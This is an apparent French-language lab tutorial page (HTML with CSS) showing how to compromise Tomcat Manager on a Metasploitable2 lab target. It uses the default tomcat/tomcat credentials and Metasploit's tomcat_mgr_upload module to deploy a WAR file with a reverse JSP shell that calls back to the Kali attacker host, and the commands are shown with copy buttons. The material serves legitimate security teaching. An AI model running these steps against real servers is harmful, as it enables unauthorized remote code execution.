@@ -1,0 +1,1207 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Tomcat Manager — Creds + WAR</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Fraunces:opsz,wght@9..144,400;9..144,500;9..144,600&family=IBM+Plex+Sans:wght@400;500;600&family=IBM+Plex+Mono:wght@400;500&display=swap" rel="stylesheet">
+<style>
+  :root{
+    --bg:#0b0e14;
+    --panel:#12161f;
+    --panel-alt:#161b26;
+    --border:#232937;
+    --text:#e7e9ee;
+    --muted:#8b93a5;
+    --accent:#ff8a5c;
+    --accent-soft:#ff8a5c22;
+    --ok:#5fd9a4;
+    --ok-soft:#5fd9a422;
+    --serif:'Fraunces', serif;
+    --sans:'IBM Plex Sans', sans-serif;
+    --mono:'IBM Plex Mono', monospace;
+  }
+
+  *{box-sizing:border-box;}
+  html{scroll-behavior:smooth;}
+
+  body{
+    margin:0;
+    background:var(--bg);
+    color:var(--text);
+    font-family:var(--sans);
+    line-height:1.6;
+    -webkit-font-smoothing:antialiased;
+  }
+
+  ::selection{background:var(--accent-soft); color:var(--accent);}
+
+  a{color:var(--accent);}
+
+  .wrap{
+    max-width:760px;
+    margin:0 auto;
+    padding:0 24px;
+  }
+
+  /* ---------- HERO ---------- */
+  .hero{
+    padding:96px 0 64px;
+    border-bottom:1px solid var(--border);
+  }
+  .breadcrumb{margin:0 0 18px;}
+  .breadcrumb a{
+    font-family:var(--mono);
+    font-size:13px;
+    color:var(--muted);
+    text-decoration:none;
+    border-bottom:1px solid transparent;
+  }
+  .breadcrumb a:hover{color:var(--accent); border-bottom-color:var(--accent);}
+  .hero .kicker{
+    font-family:var(--mono);
+    font-size:13px;
+    color:var(--accent);
+    margin:0 0 20px;
+  }
+  .hero .kicker::before{content:"$ "; color:var(--muted);}
+  .hero h1{
+    font-family:var(--serif);
+    font-weight:600;
+    font-size:clamp(34px,5vw,52px);
+    line-height:1.1;
+    margin:0 0 20px;
+    letter-spacing:-0.01em;
+  }
+  .hero p.lead{
+    font-size:17px;
+    color:var(--muted);
+    max-width:56ch;
+    margin:0 0 32px;
+  }
+  .meta-row{
+    display:flex;
+    flex-wrap:wrap;
+    gap:28px;
+  }
+  .meta-item{font-size:13px;}
+  .meta-item .label{
+    display:block;
+    color:var(--muted);
+    margin-bottom:4px;
+  }
+  .meta-item .value{
+    font-family:var(--mono);
+    color:var(--text);
+  }
+  .badge{
+    display:inline-block;
+    font-family:var(--mono);
+    font-size:12px;
+    padding:3px 10px;
+    border:1px solid var(--ok);
+    color:var(--ok);
+    border-radius:3px;
+  }
+  .score-badge{
+    display:inline-block;
+    font-family:var(--mono);
+    font-size:12px;
+    padding:3px 10px;
+    border-radius:3px;
+  }
+
+  /* ---------- SECTION GENERIC ---------- */
+  section{
+    padding:64px 0;
+    border-bottom:1px solid var(--border);
+  }
+  section:last-of-type{border-bottom:none;}
+  h2.section-title{
+    font-family:var(--serif);
+    font-weight:600;
+    font-size:28px;
+    margin:0 0 12px;
+  }
+  .section-intro{
+    color:var(--muted);
+    max-width:60ch;
+    margin:0 0 40px;
+    font-size:15px;
+  }
+
+  /* ---------- TIMELINE ---------- */
+  .timeline{
+    position:relative;
+    padding-left:44px;
+  }
+  .timeline::before{
+    content:"";
+    position:absolute;
+    left:15px;
+    top:6px;
+    bottom:6px;
+    width:1px;
+    background:var(--border);
+  }
+  .step{
+    position:relative;
+    margin-bottom:56px;
+  }
+  .step:last-child{margin-bottom:0;}
+  .step-num{
+    position:absolute;
+    left:-44px;
+    top:0;
+    width:32px;
+    height:32px;
+    border-radius:50%;
+    background:var(--panel);
+    border:1px solid var(--border);
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    font-family:var(--mono);
+    font-size:13px;
+    color:var(--accent);
+  }
+  .step h3{
+    font-family:var(--sans);
+    font-weight:600;
+    font-size:19px;
+    margin:2px 0 6px;
+  }
+  .step .step-sub{
+    color:var(--muted);
+    font-size:14px;
+    margin:0 0 18px;
+  }
+
+  /* ---------- TERMINAL BLOCK ---------- */
+  .term{
+    background:var(--panel);
+    border:1px solid var(--border);
+    border-radius:8px;
+    overflow:hidden;
+    margin:0 0 18px;
+  }
+  .term-bar{
+    display:flex;
+    align-items:center;
+    gap:8px;
+    padding:9px 14px;
+    background:var(--panel-alt);
+    border-bottom:1px solid var(--border);
+    font-family:var(--mono);
+    font-size:12px;
+    color:var(--muted);
+  }
+  .term-bar .dot{
+    width:7px; height:7px; border-radius:50%;
+    background:var(--border);
+  }
+  .term pre{
+    margin:0;
+    padding:16px 18px;
+    font-family:var(--mono);
+    font-size:13px;
+    line-height:1.65;
+    overflow-x:auto;
+    white-space:pre-wrap;
+    word-break:break-word;
+  }
+  .term .prompt{color:var(--accent);}
+  .term .out{color:var(--muted);}
+  .term .ok{color:var(--ok);}
+  .term .flag{color:var(--accent);}
+
+  /* ---------- BOUTON COPIER (discret, par commande) ---------- */
+  .copy-btn{
+    display:inline-flex;
+    align-items:center;
+    justify-content:center;
+    width:20px;
+    height:20px;
+    margin-left:8px;
+    padding:0;
+    border:1px solid transparent;
+    border-radius:4px;
+    background:transparent;
+    color:var(--muted);
+    font-size:12px;
+    line-height:1;
+    cursor:pointer;
+    vertical-align:middle;
+    opacity:.55;
+    transition:opacity .15s, border-color .15s, color .15s, background .15s;
+  }
+  .term:hover .copy-btn{opacity:.9;}
+  .copy-btn:hover{opacity:1; border-color:var(--border); background:var(--panel-alt); color:var(--accent);}
+  .copy-btn.copied{opacity:1; border-color:var(--ok); color:var(--ok);}
+
+  /* ---------- EXPLAIN BOX ---------- */
+  .explain{
+    display:grid;
+    grid-template-columns:auto 1fr;
+    gap:10px 12px;
+    background:transparent;
+    border-left:2px solid var(--border);
+    padding:2px 0 2px 18px;
+    margin-top:14px;
+  }
+  .explain .k{
+    font-family:var(--mono);
+    font-size:11px;
+    color:var(--muted);
+    padding-top:2px;
+    white-space:nowrap;
+  }
+  .explain .v{
+    font-size:14.5px;
+    color:var(--text);
+  }
+  .explain .v strong{color:var(--accent); font-weight:600;}
+  .explain .k.err{color:#ff5c72;}
+  .explain .v em.err-em{color:#ff5c72; font-style:normal; font-weight:600;}
+
+  /* ---------- MÉTHODE EXACTE (playbook récapitulatif) ---------- */
+  .playbook{
+    display:flex;
+    flex-direction:column;
+    gap:0;
+    border:1px solid var(--border);
+    border-radius:8px;
+    overflow:hidden;
+    margin-bottom:40px;
+  }
+  .playbook-row{
+    display:grid;
+    grid-template-columns:28px 1fr 1.3fr;
+    gap:16px;
+    padding:14px 18px;
+    border-bottom:1px solid var(--border);
+    background:var(--panel);
+  }
+  .playbook-row:last-child{border-bottom:none;}
+  .playbook-num{
+    font-family:var(--mono);
+    color:var(--accent);
+    font-size:13px;
+  }
+  .playbook-what strong{
+    display:block;
+    font-size:14px;
+    color:var(--text);
+    margin-bottom:3px;
+  }
+  .playbook-what span{
+    font-family:var(--mono);
+    font-size:12px;
+    color:var(--ok);
+  }
+  .playbook-why{
+    font-size:13px;
+    color:var(--muted);
+  }
+  @media (max-width:640px){
+    .playbook-row{grid-template-columns:1fr; gap:4px;}
+    .playbook-num{display:none;}
+  }
+
+  /* ---------- CHEATSHEET TABLE ---------- */
+  .cheat-group{margin-bottom:32px;}
+  .cheat-group h4{
+    font-family:var(--mono);
+    font-size:13px;
+    color:var(--accent);
+    margin:0 0 14px;
+    font-weight:500;
+  }
+  table.cheat{
+    width:100%;
+    border-collapse:collapse;
+    font-size:14px;
+  }
+  table.cheat td{
+    padding:10px 0;
+    border-bottom:1px solid var(--border);
+    vertical-align:top;
+  }
+  table.cheat td.cmd{
+    font-family:var(--mono);
+    color:var(--ok);
+    width:42%;
+    padding-right:20px;
+    white-space:nowrap;
+  }
+  table.cheat td.desc{color:var(--muted);}
+  table.cheat tr:last-child td{border-bottom:none;}
+
+  /* ---------- CONCEPT CARDS ---------- */
+  .concepts{
+    display:flex;
+    flex-direction:column;
+    gap:22px;
+  }
+  .concept{
+    padding:20px 0;
+    border-top:1px solid var(--border);
+  }
+  .concept:first-child{border-top:none; padding-top:0;}
+  .concept h4{
+    font-family:var(--serif);
+    font-weight:600;
+    font-size:18px;
+    margin:0 0 8px;
+  }
+  .concept p{
+    color:var(--muted);
+    margin:0;
+    font-size:14.5px;
+    max-width:62ch;
+  }
+
+  /* ---------- TERMINAL D'ENTRAÎNEMENT ---------- */
+  .practice-wrap{
+    display:flex;
+    flex-direction:column;
+    gap:16px;
+  }
+  .info-bar{
+    display:flex;
+    flex-wrap:wrap;
+    gap:10px 28px;
+    background:var(--panel);
+    border:1px solid var(--border);
+    border-radius:8px;
+    padding:13px 18px;
+    font-family:var(--mono);
+    font-size:12.5px;
+  }
+  .info-bar .item{color:var(--muted);}
+  .info-bar .item strong{color:var(--accent); font-weight:500;}
+
+  .sim{
+    background:var(--panel);
+    border:1px solid var(--border);
+    border-radius:8px;
+    overflow:hidden;
+  }
+  .sim-bar{
+    display:flex;
+    justify-content:space-between;
+    align-items:center;
+    gap:10px;
+    padding:9px 14px;
+    background:var(--panel-alt);
+    border-bottom:1px solid var(--border);
+    font-family:var(--mono);
+    font-size:12px;
+    color:var(--muted);
+  }
+  .sim-progress{color:var(--accent);}
+  .sim-body{
+    padding:16px 18px;
+    font-family:var(--mono);
+    font-size:13px;
+    line-height:1.7;
+    max-height:420px;
+    overflow-y:auto;
+  }
+  .sim-line{margin:0 0 4px; white-space:pre-wrap; word-break:break-word;}
+  .sim-line .p{color:var(--accent);}
+  /* ---------- PROMPT RÉALISTE (style Kali / zsh deux lignes) ---------- */
+  .p-kali{display:inline-flex; flex-direction:column; line-height:1.4; vertical-align:top;}
+  .p-kali .p-user{color:var(--ok); font-weight:600;}
+  .p-kali .p-punc{color:var(--muted);}
+  .p-kali .p-dollar{color:var(--accent); margin-left:4px;}
+  .p-root{color:#ff5c72; font-weight:600;}
+  .p-path{color:#5fbfff;}
+  .sim-line .o{color:var(--muted); display:block;}
+  .sim-line .o.ok{color:var(--ok);}
+  .sim-line .o.err{color:#ff5c72;}
+  .sim-line.appear{animation:fadeSlideIn .3s ease both;}
+  @keyframes fadeSlideIn{
+    from{opacity:0; transform:translateY(4px);}
+    to{opacity:1; transform:translateY(0);}
+  }
+
+  /* ligne mise en valeur pendant la correction */
+  .sim-line.hl{
+    background:rgba(255,138,92,.12);
+    border-radius:4px;
+    padding:2px 6px;
+    margin:0 -6px 4px;
+    animation:pulseGlow 1.3s ease-in-out 2;
+  }
+  @keyframes pulseGlow{
+    0%,100%{box-shadow:0 0 0 rgba(255,138,92,0);}
+    50%{box-shadow:0 0 14px rgba(255,138,92,.45);}
+  }
+
+  /* annotation ajoutée lors d'une correction d'analyse */
+  .sim-annot{
+    margin:2px 0 10px;
+    padding:8px 12px;
+    border-left:2px solid var(--accent);
+    color:var(--accent);
+    font-size:12.5px;
+    background:var(--accent-soft);
+    border-radius:0 6px 6px 0;
+  }
+
+  /* la ligne de saisie vit DANS le flux du terminal, comme un vrai shell —
+     c'est la dernière ligne, elle défile avec le reste, pas de bloc à part */
+  .sim-inputline{
+    display:flex;
+    align-items:center;
+    gap:8px;
+    margin:0 0 4px;
+  }
+  .sim-inputline .p{color:var(--accent); flex-shrink:0;}
+  .sim-input{
+    flex:1;
+    background:transparent;
+    border:none;
+    outline:none;
+    color:var(--text);
+    font-family:var(--mono);
+    font-size:13px;
+    caret-color:var(--accent);
+    padding:0;
+  }
+  .sim-input::placeholder{color:var(--muted); opacity:.6;}
+  .sim-controls{
+    display:flex;
+    align-items:center;
+    gap:8px;
+    padding:10px 18px 16px;
+    border-top:1px solid var(--border);
+    flex-wrap:wrap;
+  }
+  .sim-btn{
+    font-family:var(--mono);
+    font-size:12px;
+    color:var(--text);
+    background:var(--panel-alt);
+    border:1px solid var(--border);
+    border-radius:6px;
+    padding:6px 12px;
+    cursor:pointer;
+    display:inline-flex;
+    align-items:center;
+    gap:6px;
+    transition:border-color .15s, transform .1s;
+  }
+  .sim-btn:hover{border-color:var(--muted); transform:translateY(-1px);}
+  .sim-btn:active{transform:translateY(0);}
+  .sim-btn:disabled{opacity:.3; cursor:default; transform:none;}
+  .sim-btn.continue{border-color:var(--accent); color:var(--accent);}
+
+  .sim-hint-box{
+    margin:0 18px 12px;
+    padding:10px 14px;
+    border-left:2px solid var(--accent);
+    font-size:13px;
+    color:var(--muted);
+    max-height:0;
+    opacity:0;
+    overflow:hidden;
+    transition:max-height .25s ease, opacity .25s ease, padding .25s ease, margin .25s ease;
+  }
+  .sim-hint-box.show{
+    max-height:120px;
+    opacity:1;
+  }
+
+  @media (max-width:640px){
+    .sim-body{max-height:320px;}
+  }
+
+  /* ---------- BOUTON D'OUVERTURE DU TERMINAL ---------- */
+  .term-launch{
+    background:var(--panel);
+    border:1px solid var(--border);
+    border-radius:10px;
+    padding:28px;
+    display:flex;
+    flex-direction:column;
+    align-items:flex-start;
+    gap:12px;
+  }
+  .term-launch-btn{
+    font-family:var(--mono);
+    font-size:14px;
+    font-weight:600;
+    color:#05100b;
+    background:var(--ok);
+    border:none;
+    border-radius:8px;
+    padding:13px 24px;
+    cursor:pointer;
+    display:inline-flex;
+    align-items:center;
+    gap:10px;
+    transition:transform .15s ease, box-shadow .15s ease;
+  }
+  .term-launch-btn:hover{transform:translateY(-1px); box-shadow:0 8px 22px rgba(95,217,164,.28);}
+  .term-launch-btn:active{transform:translateY(0);}
+  .term-launch-dot{
+    width:8px; height:8px; border-radius:50%;
+    background:#05100b;
+    animation:launchBlink 1.6s ease-in-out infinite;
+  }
+  @keyframes launchBlink{0%,100%{opacity:1;} 50%{opacity:.2;}}
+  .term-launch-sub{
+    font-family:var(--mono);
+    font-size:12px;
+    color:var(--muted);
+    margin:0;
+  }
+
+  /* ---------- OVERLAY PLEIN ÉCRAN ---------- */
+  .term-fullscreen{
+    position:fixed;
+    inset:0;
+    z-index:9999;
+    display:none;
+    flex-direction:column;
+    background:radial-gradient(circle at 50% 0%, #131826 0%, #05070a 72%);
+    opacity:0;
+    transform:scale(.98);
+    transition:opacity .22s ease, transform .22s ease;
+  }
+  .term-fullscreen.open{
+    display:flex;
+    opacity:1;
+    transform:scale(1);
+  }
+  .term-fs-header{
+    flex-shrink:0;
+    border-bottom:1px solid var(--border);
+    background:var(--panel);
+    padding:14px 22px 16px;
+  }
+  .term-fs-headrow{
+    display:flex;
+    align-items:center;
+    justify-content:space-between;
+    margin-bottom:12px;
+  }
+  .term-fs-titlebar{
+    display:flex;
+    align-items:center;
+    gap:7px;
+    font-family:var(--mono);
+    font-size:13px;
+    color:var(--muted);
+  }
+  .term-fs-dot{width:9px; height:9px; border-radius:50%; display:inline-block;}
+  .term-fs-dot.r{background:#ff5f57;}
+  .term-fs-dot.y{background:#febc2e;}
+  .term-fs-dot.g{background:#28c840;}
+  .term-fs-context{margin-left:8px; color:var(--text);}
+  .term-fs-close{
+    font-family:var(--mono);
+    font-size:13px;
+    background:transparent;
+    border:1px solid var(--border);
+    color:var(--muted);
+    border-radius:6px;
+    width:30px; height:30px;
+    cursor:pointer;
+    transition:border-color .15s, color .15s, transform .15s;
+  }
+  .term-fs-close:hover{border-color:var(--accent); color:var(--accent); transform:translateY(-1px);}
+  .term-fs-info{
+    display:flex;
+    flex-wrap:wrap;
+    align-items:center;
+    gap:8px 22px;
+    font-family:var(--mono);
+    font-size:12.5px;
+    color:var(--muted);
+    margin-bottom:14px;
+  }
+  .term-fs-info .item strong{color:var(--accent); font-weight:500;}
+
+  /* ---------- CONSIGNE FIXE (toujours visible, comme les infos IP) ---------- */
+  .term-fs-consigne{
+    display:flex;
+    align-items:flex-start;
+    gap:10px;
+    margin-top:14px;
+    padding:10px 12px;
+    background:var(--accent-soft);
+    border:1px solid var(--accent);
+    border-radius:6px;
+  }
+  .consigne-tag{
+    flex-shrink:0;
+    font-family:var(--mono);
+    font-size:10px;
+    letter-spacing:.07em;
+    text-transform:uppercase;
+    color:var(--accent);
+    border:1px solid var(--accent);
+    border-radius:3px;
+    padding:2px 7px;
+    margin-top:1px;
+  }
+  .consigne-text{
+    font-family:var(--sans);
+    font-size:13.5px;
+    color:var(--text);
+    line-height:1.5;
+  }
+  .term-fs-info .item.mode{
+    text-transform:uppercase;
+    letter-spacing:.06em;
+    color:var(--ok);
+    font-size:10.5px;
+    border:1px solid var(--ok);
+    padding:3px 9px;
+    border-radius:3px;
+    transition:color .2s, border-color .2s;
+  }
+  .term-progress{
+    display:flex;
+    align-items:center;
+    gap:14px;
+  }
+  .term-progress-track{
+    flex:1;
+    height:6px;
+    border-radius:3px;
+    background:var(--panel-alt);
+    border:1px solid var(--border);
+    overflow:hidden;
+  }
+  .term-progress-fill{
+    height:100%;
+    width:0%;
+    background:linear-gradient(90deg, var(--ok), var(--accent));
+    border-radius:3px;
+    transition:width .5s cubic-bezier(.4,0,.2,1);
+    box-shadow:0 0 10px rgba(95,217,164,.55);
+  }
+  .term-progress-label{
+    font-family:var(--mono);
+    font-size:11.5px;
+    color:var(--accent);
+    white-space:nowrap;
+  }
+
+  .term-fullscreen .sim-body{
+    flex:1;
+    overflow-y:auto;
+    max-height:none;
+    padding:20px 26px;
+    transition:filter .25s ease;
+  }
+  .term-fullscreen .sim-body.dimmed{
+    filter:brightness(.5) saturate(.85);
+    pointer-events:none;
+  }
+  .term-fs-footer{
+    flex-shrink:0;
+    border-top:1px solid var(--border);
+    background:var(--panel);
+  }
+  .term-fs-footer .sim-hint-box{margin:10px 22px 0;}
+  .term-fs-footer .sim-controls{padding:10px 22px 14px;}
+
+  /* ---------- POP-UP D'ANALYSE (remplace indice/solution/continuer en mode analyse) ---------- */
+  .analyze-popup{
+    margin:16px 22px 0;
+    padding:16px 18px;
+    border-radius:10px;
+    border:1px solid var(--accent);
+    background:linear-gradient(180deg, var(--accent-soft), var(--panel-alt) 75%);
+    box-shadow:0 14px 34px rgba(0,0,0,.4), 0 0 0 1px rgba(255,138,92,.08);
+    display:none;
+    flex-direction:column;
+    gap:12px;
+    animation:popIn .3s cubic-bezier(.34,1.56,.64,1) both;
+  }
+  .analyze-popup.leaving{animation:popOut .18s ease both;}
+  @keyframes popIn{
+    from{opacity:0; transform:translateY(14px) scale(.96);}
+    to{opacity:1; transform:translateY(0) scale(1);}
+  }
+  @keyframes popOut{
+    from{opacity:1; transform:scale(1);}
+    to{opacity:0; transform:scale(.95);}
+  }
+  .ap-tag{
+    align-self:flex-start;
+    font-family:var(--mono);
+    font-size:10px;
+    letter-spacing:.07em;
+    text-transform:uppercase;
+    color:var(--accent);
+    border:1px solid var(--accent);
+    border-radius:3px;
+    padding:3px 8px;
+  }
+  .ap-question{
+    font-family:var(--sans);
+    font-size:14.5px;
+    color:var(--text);
+    line-height:1.55;
+    margin:0;
+  }
+  .ap-hint{
+    font-size:13px;
+    color:var(--muted);
+    max-height:0;
+    opacity:0;
+    overflow:hidden;
+    border-left:2px solid var(--accent);
+    padding-left:0;
+    transition:max-height .25s ease, opacity .25s ease, padding .25s ease;
+  }
+  .ap-hint.show{max-height:200px; opacity:1; padding:8px 0 8px 12px;}
+  .ap-actions{display:flex; gap:8px; flex-wrap:wrap; align-items:center;}
+  .ap-btn{
+    font-family:var(--mono);
+    font-size:12px;
+    color:var(--text);
+    background:var(--panel-alt);
+    border:1px solid var(--border);
+    border-radius:6px;
+    padding:6px 12px;
+    cursor:pointer;
+    display:inline-flex;
+    align-items:center;
+    gap:6px;
+    transition:border-color .15s, transform .1s;
+  }
+  .ap-btn:hover{border-color:var(--muted); transform:translateY(-1px);}
+  .ap-btn.ap-continue{
+    margin-left:auto;
+    border-color:var(--ok);
+    color:var(--ok);
+    font-weight:600;
+    animation:ctaPulse 1.8s ease-in-out infinite;
+  }
+  @keyframes ctaPulse{
+    0%,100%{box-shadow:0 0 0 rgba(95,217,164,0);}
+    50%{box-shadow:0 0 16px rgba(95,217,164,.5);}
+  }
+
+  /* animation sobre au passage d'une étape à l'autre */
+  @keyframes successFlash{
+    0%{box-shadow:inset 0 0 0 rgba(95,217,164,0);}
+    35%{box-shadow:inset 0 0 46px rgba(95,217,164,.16);}
+    100%{box-shadow:inset 0 0 0 rgba(95,217,164,0);}
+  }
+  .sim-body.flash-ok{animation:successFlash .65s ease;}
+
+  @keyframes progressPulse{
+    0%,100%{box-shadow:0 0 10px rgba(95,217,164,.55);}
+    50%{box-shadow:0 0 18px rgba(95,217,164,.85);}
+  }
+  .term-progress-fill.pulse{animation:progressPulse .65s ease;}
+
+  /* ---------- FOOTER ---------- */
+  footer{
+    padding:48px 0 80px;
+  }
+  footer .note{
+    font-family:var(--mono);
+    font-size:12.5px;
+    color:var(--muted);
+    border:1px solid var(--border);
+    border-radius:8px;
+    padding:16px 18px;
+    background:var(--panel);
+  }
+  footer .note .ok{color:var(--ok);}
+
+  @media (max-width:600px){
+    .hero{padding:64px 0 48px;}
+    .timeline{padding-left:34px;}
+    .step-num{left:-34px; width:26px; height:26px; font-size:11px;}
+    .explain{grid-template-columns:1fr;}
+    .explain .k{padding-top:0;}
+    .practice-wrap{grid-template-columns:1fr;}
+    .info-panel{position:static;}
+  }
+</style>
+</head>
+<body>
+
+  <div class="wrap">
+    <div class="hero">
+      <p class="breadcrumb"><a href="index.html">← Hub</a></p>
+      <p class="kicker">metasploitable2 :: web → app server → shell</p>
+      <h1>Tomcat Manager<br>Creds + WAR</h1>
+      <p class="lead">Le gestionnaire d'administration de Tomcat est fait pour déployer du code. S'il est accessible avec ses identifiants d'usine, il devient le chemin le plus court vers l'exécution de commandes.</p>
+      <div class="meta-row">
+        <div class="meta-item"><span class="label">Cible</span><span class="value">Metasploitable2 · 192.168.56.20</span></div>
+        <div class="meta-item"><span class="label">Attaquant</span><span class="value">Kali Linux · 192.168.56.10</span></div>
+        <div class="meta-item"><span class="label">Réseau</span><span class="value">Réseau interne VirtualBox (isolé)</span></div>
+        <div class="meta-item"><span class="label">Résultat</span><span class="badge">shell tomcat55</span></div>
+        <div class="meta-item"><span class="label">Difficulté</span><span class="score-badge" style="color:#ff8a5c; border:1px solid #ff8a5c; background:#ff8a5c18;">4/10 · Intermédiaire</span></div>
+        <div class="meta-item"><span class="label">Puissance</span><span class="score-badge" style="color:#ff5c72; border:1px solid #ff5c72; background:#ff5c7218;">4/5 · Contrôle total</span></div>
+      </div>
+    </div>
+  </div>
+
+  <div class="wrap">
+    <section id="chrono">
+      <h2 class="section-title">Chronologie</h2>
+      <p class="section-intro">Cinq étapes : identifier le service, comprendre ce que le manager autorise, s'y authentifier, déployer une archive piégée, et constater le niveau d'accès réel obtenu.</p>
+
+      <h4 style="font-family:var(--mono); font-size:13px; color:var(--accent); margin:0 0 14px; font-weight:500;">Méthode exacte, en un coup d'œil</h4>
+      <div class="playbook">
+        <div class="playbook-row">
+          <div class="playbook-num">1</div>
+          <div class="playbook-what"><strong>Reconnaissance ciblée</strong><span>nmap -sV -p 8080</span></div>
+          <div class="playbook-why">Confirmer la présence du serveur d'application et sa version exacte — le manager n'est pas toujours exposé sur le port par défaut.</div>
+        </div>
+        <div class="playbook-row">
+          <div class="playbook-num">2</div>
+          <div class="playbook-what"><strong>Analyse du service</strong><span>Ce que fait un manager Tomcat</span></div>
+          <div class="playbook-why">Comprendre que ce panneau sert précisément à déployer du code exécutable par conception — l'authentification est la seule barrière.</div>
+        </div>
+        <div class="playbook-row">
+          <div class="playbook-num">3</div>
+          <div class="playbook-what"><strong>Chargement du module</strong><span>use exploit/multi/http/tomcat_mgr_upload</span></div>
+          <div class="playbook-why">Utiliser un module qui automatise l'authentification et le déploiement d'une archive WAR piégée, plutôt que de le faire à la main.</div>
+        </div>
+        <div class="playbook-row">
+          <div class="playbook-num">4</div>
+          <div class="playbook-what"><strong>Configuration</strong><span>set RHOSTS / RPORT / HttpUsername / HttpPassword</span></div>
+          <div class="playbook-why">Fournir la cible, le port du manager, et les identifiants d'usine — c'est cette étape qui matérialise la faille de configuration.</div>
+        </div>
+        <div class="playbook-row">
+          <div class="playbook-num">5</div>
+          <div class="playbook-what"><strong>Exploitation et vérification</strong><span>run, puis whoami</span></div>
+          <div class="playbook-why">Déclencher l'attaque, puis vérifier immédiatement le niveau d'accès obtenu — ici celui du compte de service, pas root.</div>
+        </div>
+      </div>
+
+      <div class="timeline">
+
+        <div class="step">
+          <div class="step-num">1</div>
+          <h3>Identifier le serveur d'application</h3>
+          <p class="step-sub">Le gestionnaire Tomcat est souvent exposé sur le port 8080, mais pas toujours. On vérifie.</p>
+          <div class="term">
+            <div class="term-bar"><span class="dot"></span>kali@kali</div>
+            <pre><span class="prompt">$</span> nmap -sV -p 8080 192.168.56.20<button class="copy-btn" type="button" data-copy="nmap -sV -p 8080 192.168.56.20" aria-label="Copier la commande" title="Copier">⧉</button>
+<span class="out">PORT     STATE SERVICE VERSION</span>
+<span class="out">8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1</span></pre>
+          </div>
+          <div class="explain">
+            <span class="k">pourquoi</span><span class="v">Un scan trop large noie l'information. Cibler le port 8080 va droit au but si l'on cherche un serveur d'application — c'est la convention la plus répandue.</span>
+            <span class="k">Tomcat/Coyote</span><span class="v"><strong>Coyote</strong> est le connecteur HTTP de Tomcat. La version 1.1 confirme un serveur ancien et probablement non durci.</span>
+            <span class="k">à retenir</span><span class="v">Contrairement à vsftpd ou distccd, on ne cherche pas ici une faille dans le code du service. On cherche un <strong>panneau d'administration</strong> exposé.</span>
+          </div>
+        </div>
+
+        <div class="step">
+          <div class="step-num">2</div>
+          <h3>Comprendre ce qu'est le manager Tomcat</h3>
+          <p class="step-sub">Le <em>Tomcat Web Application Manager</em> est une interface d'administration accessible via une URL dédiée.</p>
+          <div class="term">
+            <div class="term-bar"><span class="dot"></span>kali@kali</div>
+            <pre><span class="out">URL typique : http://&lt;cible&gt;:8080/manager/html</span>
+<span class="out">→ Demande un couple login / mot de passe.</span>
+<span class="out">→ Une fois authentifié, permet d'<span class="flag">uploader</span> et <span class="flag">déployer</span> des applications web (fichiers .war, .jar).</span>
+<span class="out">→ Ces applications s'exécutent avec les droits du compte de service Tomcat.</span></pre>
+          </div>
+          <div class="explain">
+            <span class="k">légitime</span><span class="v">Déployer une WAR est le <strong>but premier</strong> de ce gestionnaire : c'est un outil d'administration, pas une faille. Le vrai problème est l'accès à cet outil.</span>
+            <span class="k">barrière</span><span class="v">Une page de login apparaît. Sans identifiants valides, impossible d'aller plus loin. C'est une différence majeure avec distccd, qui n'exigeait <strong>aucune authentification</strong>.</span>
+            <span class="k">creds par défaut</span><span class="v">L'installation fournit des identifiants par défaut : <strong>tomcat</strong> / <strong>tomcat</strong>. Sur un serveur non durci, ils n'ont jamais été changés.</span>
+          </div>
+        </div>
+
+        <div class="step">
+          <div class="step-num">3</div>
+          <h3>Automatiser l'attaque avec Metasploit</h3>
+          <p class="step-sub">Le module <code>tomcat_mgr_upload</code> gère l'authentification, fabrique une archive WAR contenant un payload, et la déploie.</p>
+          <div class="term">
+            <div class="term-bar"><span class="dot"></span>kali@kali</div>
+            <pre><span class="prompt">$</span> msfconsole<button class="copy-btn" type="button" data-copy="msfconsole" aria-label="Copier la commande" title="Copier">⧉</button>
+<span class="out">Metasploit tip: You can pivot connections over sessions started with the ssh_login modules</span>
+<span class="out">…</span>
+<span class="prompt">msf ></span> use exploit/multi/http/tomcat_mgr_upload<button class="copy-btn" type="button" data-copy="use exploit/multi/http/tomcat_mgr_upload" aria-label="Copier la commande" title="Copier">⧉</button>
+<span class="ok">[*] Using configured payload java/jsp_shell_reverse_tcp</span>
+<span class="prompt">msf exploit(tomcat_mgr_upload) ></span> set RHOSTS 192.168.56.20<button class="copy-btn" type="button" data-copy="set RHOSTS 192.168.56.20" aria-label="Copier la commande" title="Copier">⧉</button>
+<span class="ok">RHOSTS => 192.168.56.20</span>
+<span class="prompt">msf exploit(tomcat_mgr_upload) ></span> set RPORT 8080<button class="copy-btn" type="button" data-copy="set RPORT 8080" aria-label="Copier la commande" title="Copier">⧉</button>
+<span class="ok">RPORT => 8080</span>
+<span class="prompt">msf exploit(tomcat_mgr_upload) ></span> set HttpUsername tomcat<button class="copy-btn" type="button" data-copy="set HttpUsername tomcat" aria-label="Copier la commande" title="Copier">⧉</button>
+<span class="ok">HttpUsername => tomcat</span>
+<span class="prompt">msf exploit(tomcat_mgr_upload) ></span> set HttpPassword tomcat<button class="copy-btn" type="button" data-copy="set HttpPassword tomcat" aria-label="Copier la commande" title="Copier">⧉</button>
+<span class="ok">HttpPassword => tomcat</span>
+<span class="prompt">msf exploit(tomcat_mgr_upload) ></span> run<button class="copy-btn" type="button" data-copy="run" aria-label="Copier la commande" title="Copier">⧉</button>
+<span class="out">[*] Started reverse TCP handler on 192.168.56.10:4444 </span>
+<span class="ok">[*] Automatically selected target: Java Universal</span>
+<span class="ok">[*] Uploading payload...</span>
+<span class="ok">[*] Deploying payload...</span>
+<span class="ok">[*] Command shell session 1 opened (192.168.56.10:4444 -> 192.168.56.20:52134)</span></pre>
+          </div>
+          <div class="explain">
+            <span class="k">module</span><span class="v">Le chemin <strong>multi/http</strong> signifie que le module gère plusieurs chemins d'accès au manager. Il utilise les variables <strong>HttpUsername</strong> et <strong>HttpPassword</strong> pour s'authentifier.</span>
+            <span class="k">payload</span><span class="v">Le payload par défaut <strong>java/jsp_shell_reverse_tcp</strong> est une page JSP malveillante encapsulée dans un fichier WAR. Une fois déployée, cette page renvoie un shell à l'attaquant.</span>
